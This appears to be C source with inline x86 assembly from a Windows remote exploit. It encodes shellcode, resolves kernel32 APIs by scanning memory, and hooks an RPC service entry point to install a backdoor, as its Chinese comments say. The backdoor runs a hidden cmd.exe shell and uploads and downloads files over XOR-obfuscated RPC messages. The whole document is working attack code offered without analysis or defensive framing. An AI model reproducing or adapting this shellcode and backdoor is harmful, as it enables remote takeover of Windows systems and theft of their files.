
int codeshell(char *codebuff,int bufflen,char *shell,int shelllen)
{
    int i,k;
	unsigned char temp;

    for(i=0,k=0;i<shelllen;++i)
	{
		 temp=shell[i];
		 temp^=DATAXORCODE;
		 if(temp<0x1||temp==ESCCODE||temp==NOPCODE){
		   codebuff[i+k]=ESCCODE;
		   ++k;
		   temp+=0x40;
		 }
		 codebuff[i+k]=temp;
	}
    codebuff[i+k]=0;
    return (i+k);
}



int   getapistr(char *buff)
{
 
 int  i;
 char *str="LoadLibraryA""\x0""CreatePipe""\x0"
	   "CreateProcessA""\x0""CloseHandle""\x0"
	   "PeekNamedPipe""\x0"
	   "ReadFile""\x0""WriteFile""\x0"
	   "CreateFileA""\x0"
	   "GetFileSize""\x0"
	   "GetLastError""\x0"
	   "Sleep""\x0"
//	   "CloseHandle""\x0"
	   "\x09""rpcrt4.dll""\x0"
	   "I_RpcGetBuffer""\x0"
	   "NdrServerCall2""\x0"
//	   "\x09""msgsvc.dll""\x0"
	   "\x0"
	   "cmd.exe""\x0""\x0d\x0a""exit""\x0d\x0a""\x0"
	   "XORDATA""\x0"
	   "strend";
 for(i=0;i<0x400;++i)
 { 
	  if(memcmp(str+i,"strend",6)==0) break;
 }	
 memcpy(buff,str,i);
 return i;
}


void findshellcodefn()
{
        
	int  k,ecb;
	char *stradd;
	char *except[2];

	_asm {  
	            
		              jmp    nextcall
         getstradd:   pop    stradd
		              lea    EDI,except
					  mov    eax,dword ptr FS:[0]
					  mov    dword ptr FS:[0],EDI
	}
	   except[0]=0xffffffff;
	   except[1]=stradd-0x07; 
	   k=0;
	   ecb=0x1000;

   _asm{
	   	  call getexceptretadd
	  }
   if(k==0){
      ecb&=0xfffff000;
      ecb+=0x1000;
   }
   else ecb+=1;
  
	
	  for(;;++ecb)
	  {      
		    k=0;
	    	if(*(int *)ecb==0x90){
				if(*(int *)(ecb+8)==(int *)ecb){
					k=1;
					if(*(int *)*(int *)(ecb+0x64)=='okok')	break;

                }
			} 
 	  } 

//	  *(int *)(ecb+0x70)=0;
// 第一次溢出进入，需要安装后门

	  k=*(int *)(ecb+0x78);
	  _asm{
       push  ecb
       call  k

   getexceptretadd:
	               pop  eax
				   push eax
				   mov  edi,dword ptr [stradd]
				   mov dword ptr [edi-0x0e],eax
				   ret
	  
errprogram:		   mov eax,dword ptr [esp+0x0c]
				   add eax,0xb8
				   mov dword ptr [eax],0x11223344  //stradd-0xe
				   xor eax,eax				//2
				   ret						//1
execptprogram:     jmp errprogram			//2 bytes	 stradd-7
nextcall:          call getstradd			//5 bytes
	               nop
				   nop
				   nop
				   nop
				   nop
				   nop
				   nop
				   nop
	  }


}

void  shellcodefnlock()
{
   	_asm{
	          nop
	          nop
	          nop
	          nop
			  nop
			  nop
			  nop
			  nop
              
//			  pushad

              cld
              jmp   next
getediadd:	  pop   edi
			  push  edi
			  push  edi    // shelladd
			  push  edi    // retadd
			  pop   esi
			  xor   ecx,ecx
looplock:     lodsb
			  cmp  al,cl
			  jz   shelladd
			  cmp  al,ESCCODE
			  jz   clean0
			  cmp  al,NOPCODE
			  jnz  sto
			  xor  eax,eax
			  mov  al,NEXTSHELLOFFSET
			  add  esi,eax
			  lodsb
sto:	      xor  al,DATAXORCODE
			  stosb
			  jmp  looplock
clean0:       lodsb
			  sub al,0x40
			  jmp sto
next:         call  getediadd
shelladd:     NOP
			  NOP
			  NOP
			  NOP
			  NOP
			  NOP
			  NOP
			  NOP
			  
	}
}		 
 


void shellcodefn(PRPC_MESSAGE _pRpcMessage)
{
	char        Buff[SHELLBUFFSIZE+2];
   
	FARPROC     NdrServerCall2add;
    FARPROC     I_RpcGetBufferadd;

   // FARPROC     CloseHandleadd;
    FARPROC     Sleepadd;
    FARPROC     GetLastErroradd;
    FARPROC     GetFileSizeadd;	
	FARPROC     CreateFileAadd;
	FARPROC     WriteFileadd;
	FARPROC     ReadFileadd;
	FARPROC     PeekNamedPipeadd;
	FARPROC     CloseHandleadd;
	FARPROC     CreateProcessadd;
	FARPROC     CreatePipeadd;
	FARPROC	    procloadlib;

	FARPROC     apifnadd[1];
	FARPROC     procgetadd=0;
//    FARPROC     writeclient= *(int *)(ecb+0x84);
//    FARPROC     readclient = *(int *)(ecb+0x88);
//	HCONN       ConnID     = *(int *)(ecb+8) ;
	char        *stradd,*stradd2;
	int         imgbase,fnbase,i,k,l;
	HANDLE      libhandle;
	int         fpt;   //libwsock32;  
    STARTUPINFO siinfo;

    PROCESS_INFORMATION ProcessInformation;
    HANDLE      hReadPipe1,hWritePipe1,hReadPipe2,hWritePipe2;
	int         lBytesRead;
//    int  lockintvar1,lockintvar2;
    char lockcharvar;
    int  *except[3];
    int  rpcshell=1;
    int  shelladd;
	
	SECURITY_ATTRIBUTES sa;

   



	_asm {            jmp    nextcall
         getstradd:   pop    stradd
					  lea    EDI,except
					  mov    eax,dword ptr FS:[0]
					  mov    dword ptr [edi+0x08],eax
					  mov    dword ptr FS:[0],EDI
	}
	   except[0]=0xffffffff;
	   except[1]=stradd-0x07;

	   imgbase=0x77e00000;
	   _asm{
		  call getexceptretadd
	   }
       for(;imgbase<0xbffa0000,procgetadd==0;){
			imgbase+=0x10000;
			if(imgbase==0x78000000) imgbase=0xbff00000;
			if(*( WORD *)imgbase=='ZM'&& *(WORD *)(imgbase+*(int *)(imgbase+0x3c))=='EP'){
				   fnbase=*(int *)(imgbase+*(int *)(imgbase+0x3c)+0x78)+imgbase;
				   k=*(int *)(fnbase+0xc)+imgbase;
				   if(*(int *)k =='NREK'&&*(int *)(k+4)=='23LE'){
					  libhandle=imgbase;
					  k=imgbase+*(int *)(fnbase+0x20);
					  for(l=0;l<*(int *) (fnbase+0x18);++l,k+=4){
					    if(*(int *)(imgbase+*(int *)k)=='PteG'&&*(int *)(4+imgbase+*(int *)k)=='Acor')
						{
						   k=*(WORD *)(l+l+imgbase+*(int *)(fnbase+0x24));
					//	   k+=*(int *)(fnbase+0x10)-1;
						   k=*(int *)(k+k+k+k+imgbase+*(int *)(fnbase+0x1c));
						   procgetadd=k+imgbase;
						   break;
						}
					  }
				   }
			}
		  }
//搜索KERNEL32。DLL模块地址和API函数 GetProcAddress地址
//注意这儿处理了搜索页面不在情况。

   
	   _asm{
		   lea edi,except
           mov eax,dword ptr [edi+0x08]   
		   mov dword ptr fs:[0],eax
	   }
	   


		if(procgetadd==0) goto  die ;
         stradd2=stradd;
		 for(k=1;*stradd2!=0;++k) {
			    if(*stradd2==0x9)
				{
				   libhandle=procloadlib(stradd2+1);
				   --k;
				}
				else     apifnadd[k]=procgetadd(libhandle,stradd2);
				for(;*stradd2!=0;++stradd2){
				}
				++stradd2;
		   }
		   ++stradd2;

    k=JMPTOSHELLADDRESS;
	i=*(int *)(k-4);
	if(i!=k)
	{    
		 i=*(int *)(0x7ffdf008); // locator.exe address;
		 _asm{
		    call getexceptretadd
		 }
		 ++i;
		 for(;;++i){
    		 if(*(int *)i==0x44&&*(int *)(i+4)==0xd3fbb514){
                 i=*(int *)(i+0x2c);
	    		 i=*(int *)(i+4);
		    	 *(int *)i=k;
				 break;
			 }
		 } 		   
 //  HOOK 第一个RPC服务入口。

		   shelladd=_pRpcMessage;
		   *(int *)(k-4)=k;
           *(int *)k=    0x0424448b;
		   *(int *)(k+4)=0x8008408b;   
           *(int *)(k+8)=0x06747238;   // rpcd 0x72
           *(int *)(k+0xc)=0x68;
		   *(int *)(k+0xd)=NdrServerCall2add;
           *(int *)(k+0x11)=0x68c3;
		   *(int *)(k+0x13)=shelladd;
		   *(int *)(k+0x17)=0xc3c3c3c3;
           rpcshell=0;
	}

   
/*
   install door

   mov eax,[esp+4]
   mov eax,[eax+8]
   cmp byte ptr [eax],0xeb
   jz  hook
   push NdrServerCall2
   ret 
hook:
   push shelladd
   ret  

*/



	

            sa.nLength=12;
            sa.lpSecurityDescriptor=0;
            sa.bInheritHandle=TRUE;
 
           

// ZeroMemory(&siinfo,sizeof(siinfo));
            _asm{
 	            lea EDI,siinfo
	            xor eax,eax
	            mov ecx,0x11
	            repnz stosd
			}
    siinfo.dwFlags = STARTF_USESHOWWINDOW|STARTF_USESTDHANDLES;
    siinfo.wShowWindow = SW_HIDE;
    
	
    if (rpcshell==0)
	{
            CreatePipeadd(&hReadPipe1,&hWritePipe1,&sa,0);
            CreatePipeadd(&hReadPipe2,&hWritePipe2,&sa,0);
            k=JMPTOSHELLADDRESS+0x90;
            *(int *)k= hReadPipe1;
            *(int *)(k+4)=hWritePipe2;
            siinfo.hStdInput = hReadPipe2;
            siinfo.hStdOutput=hWritePipe1;
            siinfo.hStdError =hWritePipe1;
		
			k=CreateProcessadd(NULL,stradd2,NULL,NULL,1,0,NULL,NULL,&siinfo,&ProcessInformation);
//          stradd2+=8;

	    while(1)	Sleepadd(0x7fffffff);
	}
    else
	{
        stradd2+=8;
        k=JMPTOSHELLADDRESS+0x90;
        hReadPipe1= *(int *)k;
        hWritePipe2=*(int *)(k+4);
        k = (unsigned char __RPC_FAR *) _pRpcMessage->Buffer;
		i=_pRpcMessage->BufferLength;
        _pRpcMessage->BufferLength=4;
        if(i>=5&&*(int *)k=='dcpr')   //rpcd
		{
			for(l=0;l<i-5;++l)  *(char *)(l+k+5)^=DATAXORCODE;

            if(*(char *)(k+4)==IISCMD)
			{
                WriteFileadd(hWritePipe2,stradd2+8,8,&l,0);

                CreatePipeadd(&hReadPipe1,&hWritePipe1,&sa,0);
                CreatePipeadd(&hReadPipe2,&hWritePipe2,&sa,0);
                l=JMPTOSHELLADDRESS+0x90;
                *(int *)l= hReadPipe1;
                *(int *)(l+4)=hWritePipe2;
                siinfo.hStdInput = hReadPipe2;
                siinfo.hStdOutput=hWritePipe1;
                siinfo.hStdError =hWritePipe1;

 		        l=CreateProcessadd(NULL,k+5,NULL,NULL,1,0,NULL,NULL,&siinfo,&ProcessInformation);


			}
			if(*(char *)(k+4)==IISDATA)
			{
                if(i>5) WriteFileadd(hWritePipe2,*(int *)&_pRpcMessage->Buffer+5,i-5,&l,0);
                Sleepadd(100);
			
			    l=0;
	    	    if(i==5) PeekNamedPipeadd(hReadPipe1,Buff,SHELLBUFFSIZE,&l,0,0);
            
			    if(l>0) _pRpcMessage->BufferLength=l;
			    else
				{
                   _pRpcMessage->BufferLength=4;
				}

                I_RpcGetBufferadd( _pRpcMessage );
        
                if(l>0)
				{
					ReadFileadd(hReadPipe1,_pRpcMessage->Buffer,l,&l,0);
			        for(i=0;i<l;++i)
                    *(char *)(i+(unsigned char __RPC_FAR *) _pRpcMessage->Buffer)^=DATAXORCODE;
				}
				else
				{
				    l = (unsigned char __RPC_FAR *) _pRpcMessage->Buffer;
                    *(int *) l=OKNUM;
				}
			}

			if(*(char *)(k+4)==IISPUT)
			{
                if(*(char *)(k+5)==FILEOPEN)
				{
					fpt=CreateFileAadd(k+0x6,FILE_FLAG_WRITE_THROUGH+GENERIC_WRITE,FILE_SHARE_READ,NULL,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,0);
					
				    I_RpcGetBufferadd( _pRpcMessage );
		            l = (unsigned char __RPC_FAR *) _pRpcMessage->Buffer;
                    *(int *) l=fpt;
               	    for(i=0;i<4;++i)  *(char *)(l+i)^=DATAXORCODE;


				}
                if(*(char *)(k+5)==FILEDATA)
				{
				   fpt=*(int *)(k+6);
                   WriteFileadd(fpt,k+10,i-10,&l,0);
                }
				if(*(char *)(k+5)==FILECLOSE)
				{
					fpt=*(int *)(k+6);
					CloseHandleadd(fpt);
                }
			 }


			 if(*(char *)(k+4)==IISGET)
			 {
				if(*(char *)(k+5)==FILEOPEN)
				{
				    fpt=CreateFileAadd(k+6,GENERIC_READ,FILE_SHARE_READ+FILE_SHARE_WRITE,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,0); 
                  	
					_pRpcMessage->BufferLength=8;
			        I_RpcGetBufferadd( _pRpcMessage );
		       
					l = (unsigned char __RPC_FAR *) _pRpcMessage->Buffer;
                    *(int *) l=fpt;
					i=GetFileSizeadd(fpt,&fpt);
                    *(int *) (l+4)=i;

               	    for(i=0;i<8;++i)  *(char *)(l+i)^=DATAXORCODE;


				}
                                                
				if(*(char *)(k+5)==FILECLOSE)
				{
					fpt=*(int *)(k+6);
					CloseHandleadd(fpt);
                }
                if(*(char *)(k+5)==FILEDATA)
				{
				   fpt=*(int *)(k+6);

				   l=SHELLBUFFSIZE; 
                   ReadFileadd(fpt,Buff,l,&l,0);
				   _pRpcMessage->BufferLength=l;
			       I_RpcGetBufferadd( _pRpcMessage );
                   k = (unsigned char __RPC_FAR *) _pRpcMessage->Buffer;
                   for(i=0;i<l;++i)  *(char *)(k+i)=Buff[i]^DATAXORCODE;

				}
				   
			 }
	       

          }			
		  else
		  {
		//	WriteFileadd(hWritePipe2,stradd2,2,&k,0);
            I_RpcGetBufferadd( _pRpcMessage );
		    k = (unsigned char __RPC_FAR *) _pRpcMessage->Buffer;
            *(int *) k=OKNUM;
		  }
    }
     
		  _asm
		  {
			  xor esi,esi
			xor eax,eax
            leave
	//		pop eax
	//		pop eax
	//		xor eax,eax
	//		popad
			ret 04
		  }     
  
	

    die: goto die  ;

  	_asm{

getexceptretadd:   pop  eax
				   push eax
				   mov  edi,dword ptr [stradd]
				   mov dword ptr [edi-0x0e],eax
				   ret
errprogram:		   mov eax,dword ptr [esp+0x0c]
				   add eax,0xb8
				   mov dword ptr [eax],0x11223344  //stradd-0xe
				   xor eax,eax				//2
				   ret						//1
execptprogram:     jmp errprogram			//2 bytes	 stradd-7
nextcall:          call getstradd			//5 bytes
				   NOP
				   NOP
				   NOP
				   NOP
				   NOP
				   NOP
				   NOP
				   NOP
				   NOP
		}		
}
 
 
